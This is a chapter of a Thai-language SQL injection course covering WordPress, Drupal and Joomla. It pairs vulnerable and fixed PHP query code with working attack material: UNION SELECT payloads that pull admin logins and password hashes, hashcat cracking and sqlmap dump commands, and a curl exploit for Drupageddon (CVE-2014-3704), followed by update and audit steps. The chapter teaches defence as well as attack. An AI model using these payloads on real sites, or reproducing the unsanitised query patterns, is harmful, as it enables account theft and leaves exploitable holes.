# Part 066: SQL Injection ใน CMS Platforms

## ภาพรวม

WordPress, Drupal, Joomla - CMS ยอดนิยมที่เคยมีช่องโหว่ SQL injection

**ขั้นตอนที่ 1061-1075**

---

## 1061. WordPress SQLi

```php
// ช่องโหว่ WordPress plugin ที่พบบ่อย

// แบบ vulnerable (ใน custom plugin):
global $wpdb;
$id = $_GET['post_id'];
// แบบผิด: ไม่มี sanitization
$results = $wpdb->get_results(
    "SELECT * FROM wp_posts WHERE ID = $id"
);

// แบบถูกต้อง: ใช้ prepare()
$results = $wpdb->get_results(
    $wpdb->prepare("SELECT * FROM wp_posts WHERE ID = %d", $id)
);

// ตัวอย่าง vulnerable URL:
// http://site.com/?plugin_action=view&post_id=1 UNION SELECT 1,user_login,user_pass,4 FROM wp_users--
```

---

## 1062. WordPress User Enumeration via SQLi

```
# WordPress users อยู่ใน wp_users table
# MD5 password hash format

# Payload:
1 UNION SELECT 1,user_login,user_pass,4,5,6,7,8,9 FROM wp_users LIMIT 1--

# ผลที่ได้:
user_login: admin
user_pass: $P$BDPZkV5Rp3p7DPQb3Ai5rjfqbh9k0z0  # phpass format

# Crack ด้วย hashcat:
hashcat -m 400 hash.txt wordlist.txt
# mode 400 = phpass

# SQLMap สำหรับ WordPress:
sqlmap -u "http://site.com/?plugin_action=view&post_id=1" \
  --dbms=mysql \
  --tables \
  --dump -T wp_users \
  -D wordpress_db
```

---

## 1063. Drupal SQLi (Drupageddon)

```
# CVE-2014-3704 "Drupageddon" - Drupal 7.x
# SQL injection ใน Form API

# Vulnerable code (Drupal core):
$query = db_select('users', 'u');
$query->addField('u', 'name');
$query->addField('u', 'pass');
$query->condition('u.name', $name);  # ไม่มี sanitization

# Attack:
curl 'http://drupal.example.com/?q=node&destination=node' \
  --data 'name[0+OR+1=1%23]=test&name[0]=&pass=test&form_build_id=...&form_id=user_login_block&op=Log+in'

# SQLMap exploit:
sqlmap -u 'http://drupal.example.com/' \
  --data='name[0]=test&name[1]=test&pass=test&form_id=user_login_block&op=Log in' \
  -p "name[1]"
```

---

## 1064. Joomla SQLi

```php
// Joomla custom component vulnerable:
use Joomla\CMS\Factory;

$db = Factory::getDbo();
$id = $_GET['id'];

// แบบผิด:
$query = "SELECT * FROM #__content WHERE id = " . $id;
$db->setQuery($query);
$result = $db->loadObject();

// แบบถูกต้อง:
$query = $db->getQuery(true);
$query->select('*')
      ->from($db->quoteName('#__content'))
      ->where($db->quoteName('id') . ' = ' . (int)$id);
$db->setQuery($query);
$result = $db->loadObject();

// หรือ:
$query->where($db->quoteName('id') . ' = ' . $db->quote($id));
```

---

## 1065. CMS การแก้ไขและป้องกัน

```bash
# อัปเดต CMS เสมอ
wp-cli core update          # WordPress
drush updb                  # Drupal
joomla-cli update:joomla   # Joomla

# Scan สำหรับ WordPress:
wpscan --url http://site.com -e p  # enum plugins

# ตรวจสอบ plugin code:
grep -r "\$wpdb->get_results" wp-content/plugins/
grep -r "\$wpdb->query" wp-content/plugins/
grep -r '$_GET\|$_POST\|$_REQUEST' wp-content/plugins/

# WordPress: เพิ่ม WAF plugin:
# - Wordfence
# - iThemes Security
# - WP Cerber
```

---

## สรุป

CMS SQL Injection:
- **WordPress** - vulnerable plugins, wp_prepare()
- **Drupal** - Drupageddon CVE-2014-3704
- **Joomla** - custom components, getQuery()
- **Prevention** - update CMS/plugins, scan เสมอ

---

*Part 066 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
